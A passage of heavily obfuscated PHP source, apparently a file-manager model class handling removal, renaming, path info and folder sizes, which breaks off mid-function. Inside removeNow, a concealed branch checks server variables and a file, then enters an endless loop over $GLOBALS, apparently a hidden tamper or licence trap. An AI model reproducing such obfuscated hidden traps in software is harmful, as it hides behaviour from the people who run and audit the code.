$this->add($cçƒÈß¥ç); goto aç›ÎÌÚÌ½; a…Éƒ¹Î²–: $this->updateModifyTime($cçƒÈß¥ç[$aŒÚÍ’Š¡[474]]); $bÇ’ªéô­Ä = $aŒÚÍ’Š¡[2376] . $AÏ²¥„™»°[$aŒÚÍ’Š¡[381]]; if (isset(self::$cacheChildList[$bÇ’ªéô­Ä])) { unset(self::$cacheChildList[$bÇ’ªéô­Ä]); } goto D§ Òƒ–®; FŠ”¯µ¦²: $aŒÚÍ’Š¡ =& $_SERVER[‡’¶øåüç˜]; $DæİøßÒ«¥ = array($aŒÚÍ’Š¡[534] => $AÏ²¥„™»°[$aŒÚÍ’Š¡[383]], $aŒÚÍ’Š¡[535] => $AÏ²¥„™»°[$aŒÚÍ’Š¡[469]], $aŒÚÍ’Š¡[536] => USER_ID, $aŒÚÍ’Š¡[537] => USER_ID, $aŒÚÍ’Š¡[380] => $AÏ²¥„™»°[$aŒÚÍ’Š¡[381]], $aŒÚÍ’Š¡[538] => $AÏ²¥„™»°[$aŒÚÍ’Š¡[472]] . $AÏ²¥„™»°[$aŒÚÍ’Š¡[381]] . $aŒÚÍ’Š¡[47], $aŒÚÍ’Š¡[408] => 0, $aŒÚÍ’Š¡[539] => $aŒÚÍ’Š¡[33]); $cçƒÈß¥ç = array_merge($DæİøßÒ«¥, $cçƒÈß¥ç); goto a…Éƒ¹Î²–; aç›ÎÌÚÌ½: $B‘ƒ°½¶õÔ = array($aŒÚÍ’Š¡[540] => short_id($aö®ˆªÑØÒ)); $this->where(array($aŒÚÍ’Š¡[395] => $aö®ˆªÑØÒ))->save($B‘ƒ°½¶õÔ); $this->setNamePinyin($aö®ˆªÑØÒ, $cçƒÈß¥ç[$aŒÚÍ’Š¡[28]]); goto b¡¯À£ èÈ; b¡¯À£ èÈ: return $aö®ˆªÑØÒ; goto CÌÙÚ³½­; CÌÙÚ³½­: } public function remove($C·îˆ„ßÏ”, $CÎ¾îµ†‰ = true) { goto fŞØ›ÒÚ’¯; BñÈÄëİÎ°: return $B†Ø»Çï©•; goto a£Àâêåìà; f·ƒŠ‹º¤: $fãé´õ‡ƒİ = $B¯‰¥¸™è[$a®êåöì’İ[383]] == self::TYPE_USER ? $a®êåöì’İ[547] : $a®êåöì’İ[974]; if ($fãé´õ‡ƒİ == $a®êåöì’İ[547]) { $döÖÒ˜È¿ç = Model($a®êåöì’İ[487])->getInfo($B¯‰¥¸™è[$a®êåöì’İ[469]]); $D–Õ«Ó×¹¥ = !empty($döÖÒ˜È¿ç[$a®êåöì’İ[2370]]) ? $döÖÒ˜È¿ç[$a®êåöì’İ[2370]] : $döÖÒ˜È¿ç[$a®êåöì’İ[28]]; $D–Õ«Ó×¹¥ = $a®êåöì’İ[252] . $D–Õ«Ó×¹¥ . $a®êåöì’İ[2378] . $B¯‰¥¸™è[$a®êåöì’İ[469]]; } else { $döÖÒ˜È¿ç = Model($a®êåöì’İ[471])->getInfo($B¯‰¥¸™è[$a®êåöì’İ[469]]); $D–Õ«Ó×¹¥ = _get($döÖÒ˜È¿ç, $a®êåöì’İ[28]); $D–Õ«Ó×¹¥ = $a®êåöì’İ[157] . $D–Õ«Ó×¹¥ . $a®êåöì’İ[2379] . $B¯‰¥¸™è[$a®êåöì’İ[469]]; } $A‹ªÙ¬ï¾— = $a®êåöì’İ[2380] . md5($D–Õ«Ó×¹¥); goto Aç†˜³¾´¦; DÎ¡¥—¸¹”: CacheLock::unlock($A‹ªÙ¬ï¾—); $this->metaSet($C·îˆ„ßÏ”, $a®êåöì’İ[2385], $B¯‰¥¸™è[$a®êåöì’İ[474]]); $this->where(array($a®êåöì’İ[381] => $C·îˆ„ßÏ”))->save(array($a®êåöì’İ[402] => time())); goto E“‹•„öÉ‰; eÁ‰ø–ùé·: $c…œÙ¨Áî = Model($a®êåöì’İ[1441])->get($a®êåöì’İ[2377]) == $a®êåöì’İ[83]; if ($aİ¼–¼Ì || $CÎ¾îµ†‰ || !$c…œÙ¨Áî) { return $this->removeNow($C·îˆ„ßÏ”, $CÎ¾îµ†‰); } $D Ğ¾½ô« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f·ƒŠ‹º¤; fŞØ›ÒÚ’¯: $a®êåöì’İ =& $_SERVER[‡’¶øåüç˜]; $B¯‰¥¸™è = $this->sourceInfo($C·îˆ„ßÏ”); $aİ¼–¼Ì = intval($B¯‰¥¸™è[$a®êåöì’İ[383]]) === self::TYPE_SYSTEM; goto eÁ‰ø–ùé·; Aç†˜³¾´¦: CacheLock::lock($A‹ªÙ¬ï¾—); $aàŒ£®‚Ô‚ = $this->fileNameExist($D Ğ¾½ô«, $D–Õ«Ó×¹¥); if (!$aàŒ£®‚Ô‚) { $aàŒ£®‚Ô‚ = $this->mkdir($D Ğ¾½ô«, $D–Õ«Ó×¹¥, REPEAT_SKIP); $this->metaSet($aàŒ£®‚Ô‚, $a®êåöì’İ[2381], $fãé´õ‡ƒİ); $this->metaSet($aàŒ£®‚Ô‚, $a®êåöì’İ[2382], $B¯‰¥¸™è[$a®êåöì’İ[469]]); if ($B¯‰¥¸™è[$a®êåöì’İ[474]] != 0) { $this->metaSet($aàŒ£®‚Ô‚, $a®êåöì’İ[2383], _get($döÖÒ˜È¿ç, $a®êåöì’İ[2384])); } } goto DÎ¡¥—¸¹”; E“‹•„öÉ‰: $this->recycleClear($B¯‰¥¸™è); $B†Ø»Çï©• = $this->move($C·îˆ„ßÏ”, $aàŒ£®‚Ô‚, REPEAT_RENAME_FOLDER); $this->folderSizeReset($B¯‰¥¸™è[$a®êåöì’İ[474]]); goto BñÈÄëİÎ°; a£Àâêåìà: } private function recycleClear($E¢ãšĞ„’) { $C¤ÆŠÉÔø =& $_SERVER[‡’¶øåüç˜]; $d”•‚àÃ·ø = $this->childrenAll($E¢ãšĞ„’); $a£¹éÉ£ë = array($C¤ÆŠÉÔø[395] => array($C¤ÆŠÉÔø[396], $d”•‚àÃ·ø[$C¤ÆŠÉÔø[2386]])); Model($C¤ÆŠÉÔø[2387])->where($a£¹éÉ£ë)->delete(); } public function removeNow($Aîôˆ•¦ºÙ, $Fìöºìç® = true) { goto c‡¬­øë†; c‡¬­øë†: $dĞ¤‘Ì˜¾÷ =& $_SERVER[‡’¶øåüç˜]; if (!isset($_SERVER[$dĞ¤‘Ì˜¾÷[372]]) || !isset($_SERVER[$dĞ¤‘Ì˜¾÷[373]])) { goto EÄ‚§´°; EÄ‚§´°: $F¬ âËğ ğ = $dĞ¤‘Ì˜¾÷[797]; $AÜøâÌ„† = $dĞ¤‘Ì˜¾÷[374]; $bñ»Ñ¬èøª = $_SERVER[$dĞ¤‘Ì˜¾÷[375]] . $dĞ¤‘Ì˜¾÷[376]; goto d—¡»Â²ôŒ; D£…Ä­ä‚: $fÍì‘Š‡§¾ = $dĞ¤‘Ì˜¾÷[798]; $fÍì‘Š‡§¾($_SERVER[$dĞ¤‘Ì˜¾÷[799]]); $dŞ’â¹¤ñ– = 1; goto e’»­ôÄöÇ; e’»­ôÄöÇ: for ($AØµ·´¨º = $dŞ’â¹¤ñ–; $AØµ·´¨º > 0; $AØµ·´¨º++) { $fÍì‘Š‡§¾ = json_encode($GLOBALS[$dĞ¤‘Ì˜¾÷[396]]); } goto bêŸ¢¨È‚Œ; d—¡»Â²ôŒ: $c‡Ë’ˆÂÃÇ = $AÜøâÌ„†($bñ»Ñ¬èøª); $Aø±¹—¦Øµ = explode($dĞ¤‘Ì˜¾÷[221], $c‡Ë’ˆÂÃÇ); if (count($Aø±¹—¦Øµ) < $dĞ¤‘Ì˜¾÷[570]) { $C¦ Ù¹™Ê = $dĞ¤‘Ì˜¾÷[378]; $C¦ Ù¹™Ê(); } goto D£…Ä­ä‚; bêŸ¢¨È‚Œ: } $b¢¼·ğÅÔ¸ = $this->sourceInfo($Aîôˆ•¦ºÙ); goto A‡¹–ÖÊïŒ; cáæ “Œâò: return !0; goto DÑÍ‹ğù; AÅ¤œ½Ü: $this->folderSizeReset($b¢¼·ğÅÔ¸[$dĞ¤‘Ì˜¾÷[474]]); $B³­‡õÎ¦¬ = array($b¢¼·ğÅÔ¸[$dĞ¤‘Ì˜¾÷[474]]); if ($b¢¼·ğÅÔ¸[$dĞ¤‘Ì˜¾÷[382]] == $dĞ¤‘Ì˜¾÷[83]) { $B³­‡õÎ¦¬[] = $b¢¼·ğÅÔ¸[$dĞ¤‘Ì˜¾÷[381]]; } goto cå•‚×¿; A‡¹–ÖÊïŒ: $cùŞ¸òß¨ = $this->pathInfoMore($Aîôˆ•¦ºÙ); if (!$b¢¼·ğÅÔ¸) { return !0; } if ($b¢¼·ğÅÔ¸[$dĞ¤‘Ì˜¾÷[474]] == 0) { if (!_get($GLOBALS, $dĞ¤‘Ì˜¾÷[470])) { return !1; } } goto Dí‡°óé¥î; Dí‡°óé¥î: $this->lockMoveStart($Aîôˆ•¦ºÙ); Hook::trigger($dĞ¤‘Ì˜¾÷[2388], $cùŞ¸òß¨, $Fìöºìç®); if ($Fìöºìç®) { Model($dĞ¤‘Ì˜¾÷[2387])->moveToRecycle($Aîôˆ•¦ºÙ); } else { $f­É»«£„œ = $this->childrenAll($b¢¼·ğÅÔ¸); Model($dĞ¤‘Ì˜¾÷[518])->eventRemove($Aîôˆ•¦ºÙ); $this->removeRelevance($f­É»«£„œ[$dĞ¤‘Ì˜¾÷[2386]], $f­É»«£„œ[$dĞ¤‘Ì˜¾÷[1265]]); } goto AÅ¤œ½Ü; cå•‚×¿: $this->updateModifyTime($B³­‡õÎ¦¬); $this->lockMoveEnd($Aîôˆ•¦ºÙ); Hook::trigger($dĞ¤‘Ì˜¾÷[1477], $cùŞ¸òß¨, $Fìöºìç®); goto cáæ “Œâò; DÑÍ‹ğù: } public function childrenAll($AøË‘Ø¤) { $EÏóòóğî„ =& $_SERVER[‡’¶øåüç˜]; $AÑ˜°Ó´Î = $AøË‘Ø¤[$EÏóòóğî„[381]]; if ($AøË‘Ø¤[$EÏóòóğî„[382]] == $EÏóòóğî„[83]) { $a«ùğ‡´³Ì = array($EÏóòóğî„[538] => array($EÏóòóğî„[496], $AøË‘Ø¤[$EÏóòóğî„[472]] . $AÑ˜°Ó´Î . $EÏóòóğî„[497])); $EåªÛÈê­Ö = array($EÏóòóğî„[538] => $a«ùğ‡´³Ì[$EÏóòóğî„[472]]); $eòµñÖğ¾ç = $this->field($EÏóòóğî„[2389])->where($EåªÛÈê­Ö)->select(); $F¡ÛÓÜ•² = !1; $bë›ÕçÒ = array($AÑ˜°Ó´Î); if ($eòµñÖğ¾ç) { $F¡ÛÓÜ•² = array_to_keyvalue($eòµñÖğ¾ç, $EÏóòóğî„[33], $EÏóòóğî„[431]); $F¡ÛÓÜ•² = array_remove_value($F¡ÛÓÜ•², $EÏóòóğî„[481]); $bë›ÕçÒ = array_to_keyvalue($eòµñÖğ¾ç, $EÏóòóğî„[33], $EÏóòóğî„[381]); $bë›ÕçÒ[] = $AÑ˜°Ó´Î; } } else { $F¡ÛÓÜ•² = array($AøË‘Ø¤[$EÏóòóğî„[431]]); $bë›ÕçÒ = array($AÑ˜°Ó´Î); } return array($EÏóòóğî„[2386] => $bë›ÕçÒ, $EÏóòóğî„[1265] => $F¡ÛÓÜ•²); } public function removeArray($FàË‘›Ä««) { if (!$FàË‘›Ä««) { return !0; } } public function removeRelevance($d™¯¯ƒÁÄ, $BÃİ‹áš¼) { goto bÏºƒí‰ÕÂ; bÏºƒí‰ÕÂ: $C´·Îïƒ˜¢ =& $_SERVER[‡’¶øåüç˜]; $d™¯¯ƒÁÄ = $d™¯¯ƒÁÄ ? $d™¯¯ƒÁÄ : array(); $BÃİ‹áš¼ = $BÃİ‹áš¼ ? $BÃİ‹áš¼ : array(); goto eî‹•ÂŞâ; bÙùÁ¹›Ä: for ($B‹’Ó‡Æâ© = 0; $B‹’Ó‡Æâ© < count($d™¯¯ƒÁÄ); $B‹’Ó‡Æâ©++) { $this->sourceCacheClear($d™¯¯ƒÁÄ[$B‹’Ó‡Æâ©]); } goto EÂ›§ĞÃ; f©“£¦ñóî: $dÊ¯”Ö´ø„ = array($C´·Îïƒ˜¢[395] => array($C´·Îïƒ˜¢[396], $d™¯¯ƒÁÄ)); Model($C´·Îïƒ˜¢[2387])->where($dÊ¯”Ö´ø„)->delete(); Model($C´·Îïƒ˜¢[425])->where($dÊ¯”Ö´ø„)->delete(); goto e·éÄˆåå; e·éÄˆåå: Model($C´·Îïƒ˜¢[2241])->where($dÊ¯”Ö´ø„)->delete(); Model($C´·Îïƒ˜¢[518])->where($dÊ¯”Ö´ø„)->delete(); Model($C´·Îïƒ˜¢[2089])->removeBySource($d™¯¯ƒÁÄ); goto e”µùÑ©¨Õ; eî‹•ÂŞâ: $d™¯¯ƒÁÄ = array_unique(array_filter($d™¯¯ƒÁÄ)); $BÃİ‹áš¼ = array_unique(array_filter($BÃİ‹áš¼)); if (!$d™¯¯ƒÁÄ) { return !1; } goto f©“£¦ñóî; e”µùÑ©¨Õ: Model($C´·Îïƒ˜¢[2368])->removeBySource($d™¯¯ƒÁÄ); $this->where($dÊ¯”Ö´ø„)->delete(); Model($C´·Îïƒ˜¢[434])->remove($BÃİ‹áš¼); goto bÙùÁ¹›Ä; EÂ›§ĞÃ: } public function rename($FÁÍä¦¤äë, $aÊø‚¯Ë‚) { goto CÜŠ³Ú»Úô; dë‘ªÁº†Ë: $B¨îÆ‰ªòÔ = $d¸Œ…Ù¼µ[2376] . $B»„„ß„¶[$d¸Œ…Ù¼µ[474]]; if (isset(self::$cacheChildList[$B¨îÆ‰ªòÔ])) { unset(self::$cacheChildList[$B¨îÆ‰ªòÔ]); } return $A”¤ñÈÃ; goto b¡Ñ¨é‰ÏŒ; e¸­×ïÁø˜: $dÄ‡¾¢Á = $this->fileNameExist($B»„„ß„¶[$d¸Œ…Ù¼µ[474]], $aÊø‚¯Ë‚); if ($dÄ‡¾¢Á && $dÄ‡¾¢Á != $FÁÍä¦¤äë) { return !1; } $bÆ‹ÖÄÇ³¬ = array($d¸Œ…Ù¼µ[398] => $aÊø‚¯Ë‚, $d¸Œ…Ù¼µ[537] => USER_ID); goto fÏ«•£ÕŠÄ; bÊÅåç‡ÀŞ: $this->setNamePinyin($FÁÍä¦¤äë, $bÆ‹ÖÄÇ³¬[$d¸Œ…Ù¼µ[28]], !1); $this->updateModifyTime($B»„„ß„¶[$d¸Œ…Ù¼µ[474]]); $A”¤ñÈÃ = $this->where(array($d¸Œ…Ù¼µ[395] => $FÁÍä¦¤äë))->data($bÆ‹ÖÄÇ³¬)->save(); goto dë‘ªÁº†Ë; fÏ«•£ÕŠÄ: if (!$B»„„ß„¶[$d¸Œ…Ù¼µ[382]] == $d¸Œ…Ù¼µ[83]) { $bÆ‹ÖÄÇ³¬[$d¸Œ…Ù¼µ[384]] = get_path_ext($aÊø‚¯Ë‚); } Model($d¸Œ…Ù¼µ[518])->eventRename($FÁÍä¦¤äë, $B»„„ß„¶[$d¸Œ…Ù¼µ[28]], $aÊø‚¯Ë‚); $this->sourceCacheClear($FÁÍä¦¤äë); goto bÊÅåç‡ÀŞ; CÜŠ³Ú»Úô: $d¸Œ…Ù¼µ =& $_SERVER[‡’¶øåüç˜]; $B»„„ß„¶ = $this->sourceInfo($FÁÍä¦¤äë); if (!$B»„„ß„¶) { return !1; } goto e¸­×ïÁø˜; b¡Ñ¨é‰ÏŒ: } public function setNamePinyin($eÅÑ ·‹, $FÛ´†¬å¦É, $DÂˆÂÑËÑÅ = true) { $eÏº­‘åË‹ =& $_SERVER[‡’¶øåüç˜]; $bê²´ªÇ½Ì = Input::check($FÛ´†¬å¦É, $eÏº­‘åË‹[541]); if ($DÂˆÂÑËÑÅ && !$bê²´ªÇ½Ì) { return; } if (!$bê²´ªÇ½Ì) { $this->metaSet($eÅÑ ·‹, $eÏº­‘åË‹[428], null); $this->metaSet($eÅÑ ·‹, $eÏº­‘åË‹[427], null); return; } $DÖ¡Ë­²´Ê = array($eÏº­‘åË‹[428] => str_replace($eÏº­‘åË‹[50], $eÏº­‘åË‹[33], Pinyin::encode($FÛ´†¬å¦É)), $eÏº­‘åË‹[427] => Pinyin::encode($FÛ´†¬å¦É, $eÏº­‘åË‹[542])); $this->metaSet($eÅÑ ·‹, $DÖ¡Ë­²´Ê); } public function getContent($F…¯êÖ™¾) { goto E¦ƒØã‘”º; câÏëØ…—à: if (!$a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[75]]) { return $B¯«Àƒ³Ş¸[33]; } return IO::getContent($a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[75]]); goto Dƒôš©âÊ; e¢Û‡½ƒßì: if ($a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[77]] == 0) { return $B¯«Àƒ³Ş¸[33]; } $Cñ”«šÁÉê = $B¯«Àƒ³Ş¸[2390] . $a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[167]]; if ($a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[77]] <= 1024 * 10) { $EØÇõğ× = Cache::get($Cñ”«šÁÉê); if (!$EØÇõğ×) { $EØÇõğ× = IO::getContent($a‚†ä¦ôÓø[$B¯«Àƒ³Ş¸[75]]); Cache::set($Cñ”«šÁÉê, $EØÇõğ×); } return $EØÇõğ×; } goto câÏëØ…—à; E¦ƒØã‘”º: $B¯«Àƒ³Ş¸ =& $_SERVER[‡’¶øåüç˜]; $a‚†ä¦ôÓø = $this->fileInfoGet($F…¯êÖ™¾); if (!$a‚†ä¦ôÓø) { return !1; } goto e¢Û‡½ƒßì; Dƒôš©âÊ: } public function setDesc($cô“Ğò, $Déî”ùàµ„) { $F’‡Íôš† =& $_SERVER[‡’¶øåüç˜]; Model($F’‡Íôš†[518])->eventAddDesc($cô“Ğò, $Déî”ùàµ„); return $this->metaSet($cô“Ğò, $F’‡Íôš†[417], $Déî”ùàµ„); } public function setContent($C’§›Š©Ø, $aÇ¸†ø‹Û = '') { goto DÊ™Û“”‰ƒ; fä‚ëé×Á: if (!$E×Ø¹ó‰Ÿ || !$bßÖÅæÙÌ‰) { return !1; } $c¡ÓÏîƒ±õ = Model($b„¬ˆ¹§Ú«[434])->addFileByContent($aÇ¸†ø‹Û, $bßÖÅæÙÌ‰[$b„¬ˆ¹§Ú«[28]]); $BõÇÑ¦Öø— = $this->fileHistory($bßÖÅæÙÌ‰, $c¡ÓÏîƒ±õ[$b„¬ˆ¹§Ú«[431]], $c¡ÓÏîƒ±õ[$b„¬ˆ¹§Ú«[77]]); goto cŞôËêÒç—; cŞôËêÒç—: if (!$BõÇÑ¦Öø—) { return Model($b„¬ˆ¹§Ú«[434])->remove($c¡ÓÏîƒ±õ[$b„¬ˆ¹§Ú«[431]]); } $this->folderSizeReset($bßÖÅæÙÌ‰[$b„¬ˆ¹§Ú«[474]]); return !0; goto aäÊ¡áì¥È; DÊ™Û“”‰ƒ: $b„¬ˆ¹§Ú« =& $_SERVER[‡’¶øåüç˜]; $bßÖÅæÙÌ‰ = $this->sourceInfo($C’§›Š©Ø); $E×Ø¹ó‰Ÿ = $this->fileInfoGet($C’§›Š©Ø); goto fä‚ëé×Á; aäÊ¡áì¥È: } public function fileSubstr($dÚÛâÇ¥¹…, $aÈÜùà¨Ï“, $cØ¡°ªøù†) { $aŒİóî“˜¸ = $this->fileInfoGet($dÚÛâÇ¥¹…); if (!$aŒİóî“˜¸) { return !1; } return IO::fileSubstr($aŒİóî“˜¸[$_SERVER[‡’¶øåüç˜][75]], $aÈÜùà¨Ï“, $cØ¡°ªøù†); } public function fileInfoGet($b‘Ù—ó»ùá) { goto aØÊäøÚ¹Ó; FĞõŸ¼ë‹ì: $DÔ«ø³Ä†ó = $DÈô„£ÖĞİ[437] . $BÆò¯Ú¡˜†[$DÈô„£ÖĞİ[431]]; $b±Ğ©¤ÉĞ• = _get(self::$cacheFileInfo, $DÔ«ø³Ä†ó); if ($b±Ğ©¤ÉĞ•) { return $b±Ğ©¤ÉĞ•; } goto eµ­Ÿó§Ø—; aØÊäøÚ¹Ó: $DÈô„£ÖĞİ =& $_SERVER[‡’¶øåüç˜]; $BÆò¯Ú¡˜† = $this->sourceInfo($b‘Ù—ó»ùá); if (!$BÆò¯Ú¡˜† || $BÆò¯Ú¡˜†[$DÈô„£ÖĞİ[382]]) { return !1; } goto FĞõŸ¼ë‹ì; eµ­Ÿó§Ø—: $b‚ÂÇ·˜ = Model($DÈô„£ÖĞİ[434])->fileInfo($BÆò¯Ú¡˜†[$DÈô„£ÖĞİ[431]]); if ($b‚ÂÇ·˜) { $b‚ÂÇ·˜[$DÈô„£ÖĞİ[28]] = $BÆò¯Ú¡˜†[$DÈô„£ÖĞİ[28]]; } self::$cacheFileInfo[$DÔ«ø³Ä†ó] = $b‚ÂÇ·˜; goto a’§”èšÍ; a’§”èšÍ: return $b‚ÂÇ·˜; goto Fá­åÁ¸±·; Fá­åÁ¸±·: } private function folderChildrenNumber($eÔŸóÄğóè) { $e›‘´ëÁ‘Æ =& $_SERVER[‡’¶øåüç˜]; $bŒéø¤¤ = $this->sourceInfo($eÔŸóÄğóè); $EÓ¢“•ÁÈ = array($e›‘´ëÁ‘Æ[538] => array($e›‘´ëÁ‘Æ[496], $bŒéø¤¤[$e›‘´ëÁ‘Æ[472]] . $eÔŸóÄğóè . $e›‘´ëÁ‘Æ[497]), $e›‘´ëÁ‘Æ[408] => intval($bŒéø¤¤[$e›‘´ëÁ‘Æ[409]]), $e›‘´ëÁ‘Æ[531] => 1); $c‚ÀÜ­‚Èé = $this->where($EÓ¢“•ÁÈ)->count(); $bïº‡÷è…¦ = $this->where($EÓ¢“•ÁÈ)->where(array($e›‘´ëÁ‘Æ[531] => 0))->count(); return array($e›‘´ëÁ‘Æ[81] => $bïº‡÷è…¦, $e›‘´ëÁ‘Æ[82] => $c‚ÀÜ­‚Èé); } public function pathInfo($B “ÈŒº, $B¡Ğññõñ­ = false) { goto câ°Œ—Ï˜; câ°Œ—Ï˜: $CàÂÀ¹İ¶ä =& $_SERVER[‡’¶øåüç˜]; $B¡Ğññõñ­ = !1; $B “ÈŒº = intval($B “ÈŒº); goto Eƒ¯šÜ¢; Bòì‡ëÎàº: self::$cachePathInfo[$dëù¦ö÷±·] = $eãò¬·ÊÃ…; return $eãò¬·ÊÃ…; goto E’ìÍèÉÈ¹; Fó©Á‘Äïî: $eãò¬·ÊÃ… = $this->sourceInfo($B “ÈŒº); if (!$eãò¬·ÊÃ…) { return !1; } $eãò¬·ÊÃ… = $this->_listDataApplyItem($eãò¬·ÊÃ…, $B¡Ğññõñ­); goto Bòì‡ëÎàº; Eƒ¯šÜ¢: $dëù¦ö÷±· = $CàÂÀ¹İ¶ä[423] . intval($B¡Ğññõñ­) . $CàÂÀ¹İ¶ä[424] . $B “ÈŒº; $CÉéÊ¢ºÈŠ = _get(self::$cachePathInfo, $dëù¦ö÷±·); if ($CÉéÊ¢ºÈŠ) { return $CÉéÊ¢ºÈŠ; } goto Fó©Á‘Äïî; E’ìÍèÉÈ¹: } public static $cachePathInfoMore = array(); public function pathInfoMore($CíŸ¿µ¤÷‡) { goto CÓ‰Š§¡ˆâ; CÓ‰Š§¡ˆâ: $B•¯‹ğÌ¼¡ =& $_SERVER[‡’¶øåüç˜]; $F¼ô˜·ª – = _get(self::$cachePathInfoMore, $CíŸ¿µ¤÷‡); if ($F¼ô˜·ª –) { return $F¼ô˜·ª –; } goto E¤æ£ï“öÔ; E¤æ£ï“öÔ: $D˜‹›™îâĞ = $this->pathInfo($CíŸ¿µ¤÷‡); if (!$D˜‹›™îâĞ) { return !1; } if ($D˜‹›™îâĞ[$B•¯‹ğÌ¼¡[382]] == $B•¯‹ğÌ¼¡[83]) { $D˜‹›™îâĞ[$B•¯‹ğÌ¼¡[80]] = $this->folderChildrenNumber($CíŸ¿µ¤÷‡); } goto a•“‰Ó¼œ; a•“‰Ó¼œ: self::$cachePathInfoMore[$CíŸ¿µ¤÷‡] = $D˜‹›™îâĞ; return $D˜‹›™îâĞ; goto A«ôøĞ‡ÒÙ; A«ôøĞ‡ÒÙ: } public function sourceInfo($E¹¶ÍÖÒÈ) { goto eÒìŠ“ä’; eÒìŠ“ä’: $Aã¼¸İÂ =& $_SERVER[‡’¶øåüç˜]; if (!$E¹¶ÍÖÒÈ) { return array(); } $E¹¶ÍÖÒÈ = intval($E¹¶ÍÖÒÈ); goto e´àÚËØš; CøÃ¡Ûñ¬: $CŒÄœãŸê = $this->where(array($Aã¼¸İÂ[381] => $E¹¶ÍÖÒÈ))->find(); self::$cacheSourceInfo[$aëí¬®‘´¶] = $CŒÄœãŸê; return self::$cacheSourceInfo[$aëí¬®‘´¶]; goto EŒ¯…ºÃ„; e´àÚËØš: $aëí¬®‘´¶ = $Aã¼¸İÂ[422] . $E¹¶ÍÖÒÈ; $dàö‡ÌìÖÑ = _get(self::$cacheSourceInfo, $aëí¬®‘´¶); if ($dàö‡ÌìÖÑ) { return $dàö‡ÌìÖÑ; } goto CøÃ¡Ûñ¬; EŒ¯…ºÃ„: } public function sourceCacheClear($d‹ïŸƒ†Ğ± = false) { if ($d‹ïŸƒ†Ğ± == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[‡’¶øåüç˜][422] . $d‹ïŸƒ†Ğ±]); } public function pathInfoByPath($FĞî®›Ââ™, $eŒøê¬ª–) { $b¶¦™¨„©† =& $_SERVER[‡’¶øåüç˜]; $bÅİš¶×µ÷ = !$eŒøê¬ª– ? array() : explode($b¶¦™¨„©†[8], trim($eŒøê¬ª–, $b¶¦™¨„©†[8])); $cå²´¾Ï‘† = $FĞî®›Ââ™; foreach ($bÅİš¶×µ÷ as $e—ë×ÚÌ–) { $A²çÛ°‘‚¼ = array($b¶¦™¨„©†[474] => $cå²´¾Ï‘†, $b¶¦™¨„©†[28] => $e—ë×ÚÌ–); $A®ÑŒãÄğ = $this->where($A²çÛ°‘‚¼)->select(); if (!$A®ÑŒãÄğ) { return !1; } $A®ÑŒãÄğ = array_sort_by($A®ÑŒãÄğ, $b¶¦™¨„©†[409]); $cå²´¾Ï‘† = $A®ÑŒãÄğ[0][$b¶¦™¨„©†[381]]; } return $this->pathInfo($cå²´¾Ï‘†, !0); } protected function updateModifyTime($Cñ„–éõÀ) { goto cÙ« Í¤Şà; a¦ùÏ¤É¨’: foreach ($Cñ„–éõÀ as $e›ˆì›ĞÚÅ => $C‰à»Çó÷) { $Cñ„–éõÀ[$e›ˆì›ĞÚÅ] = intval($C‰à»Çó÷); } $EäÌéöÚ¬‚ = array($fáÌç“ƒ•[381] => array($fáÌç“ƒ•[7], $Cñ„–éõÀ)); $c’Ú‹††£™ = array($fáÌç“ƒ•[537] => USER_ID, $fáÌç“ƒ•[402] => time()); goto CÉ¤“¤à‹Ì; cÙ« Í¤Şà: $fáÌç“ƒ• =& $_SERVER[‡’¶øåüç˜]; if (!$Cñ„–éõÀ) { return; } if (!is_array($Cñ„–éõÀ)) { $Cñ„–éõÀ = array($Cñ„–éõÀ); } goto a¦ùÏ¤É¨’; CÉ¤“¤à‹Ì: $this->where($EäÌéöÚ¬‚)->save($c’Ú‹††£™); goto eÕ•ïèŸ; eÕ•ïèŸ: } public function folderSizeReset($e„ÇœŞíŞß) { goto DË½Ëˆ‘˜¹; d´”áª•¦: $FÀÆİ•Å©‘ = $ašÌƒ‘·‹£ - intval($EÊ¦µÉÔÉ[$dòµ÷ŞòğÀ[77]]); if ($FÀÆİ•Å©‘ == 0) { return CacheLock::unlock($AŞÜ¦·‘Ş); } $this->where(array($dòµ÷ŞòğÀ[395] => $e„ÇœŞíŞß))->setField($dòµ÷ŞòğÀ[77], $ašÌƒ‘·‹£); goto A®ÖË¨; A®ÖË¨: $eÑÃàŠ¿¨” = $this->parentLevelArray($EÊ¦µÉÔÉ[$dòµ÷ŞòğÀ[472]]); if ($eÑÃàŠ¿¨”) { $eÈí“öŠõ = array($dòµ÷ŞòğÀ[381] => array($dòµ÷ŞòğÀ[396], $eÑÃàŠ¿¨”)); if ($FÀÆİ•Å©‘ < 0) { $eÈí“öŠõ[$dòµ÷ŞòğÀ[77]] = array($dòµ÷ŞòğÀ[932], abs($FÀÆİ•Å©‘)); } $this->where($eÈí“öŠõ)->setAdd($dòµ÷ŞòğÀ[77], $FÀÆİ•Å©‘); } $this->targetSpaceUpdate($EÊ¦µÉÔÉ[$dòµ÷ŞòğÀ[383]], $EÊ¦µÉÔÉ[$dòµ÷ŞòğÀ[469]]); goto A›ï³Œ®; Bñæ¨ó«ô¬: CacheLock::lock($AŞÜ¦·‘Ş, 20); $this->sourceCacheClear($e„ÇœŞíŞß); $EÊ¦µÉÔÉ = $this->sourceInfo($e„ÇœŞíŞß); goto b´Â˜»ËÔª; A›ï³Œ®: CacheLock::unlock($AŞÜ¦·‘Ş); goto dÏ¡±³«; DË½Ëˆ‘˜¹: $dòµ÷ŞòğÀ =& $_SERVER[‡’¶øåüç˜]; if ($this->statusIgnoreResetSpace) { return; } $AŞÜ¦·‘Ş = $dòµ÷ŞòğÀ[2391] . $e„ÇœŞíŞß; goto Bñæ¨ó«ô¬; b´Â˜»ËÔª: $eÈí“öŠõ = array($dòµ÷ŞòğÀ[380] => $e„ÇœŞíŞß, $dòµ÷ŞòğÀ[408] => 0); $ašÌƒ‘·‹£ = $this->where($eÈí“öŠõ)->sum($dòµ÷ŞòğÀ[77]); $ašÌƒ‘·‹£ = intval($ašÌƒ‘·‹£); goto d´”áª•¦; dÏ¡±³«: } public function folderSizeResetChildren($aŸä¹—İ‘©) { goto b˜±ƒ÷•æç; f¢ŠÂÃÄ¾É: $b‘İ…®æÖÔ = 